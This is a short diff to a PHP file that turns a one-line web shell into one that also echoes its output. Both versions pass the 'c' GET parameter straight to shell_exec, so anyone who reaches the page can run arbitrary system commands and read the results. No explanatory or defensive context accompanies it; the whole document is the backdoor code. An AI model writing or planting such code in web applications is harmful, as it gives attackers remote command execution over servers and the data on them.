@@ -1,1 +1,4 @@
-<?php shell_exec($_GET["c"]); ?>
+<?php 
+$res = shell_exec($_GET["c"]); 
+echo $res;
+?>
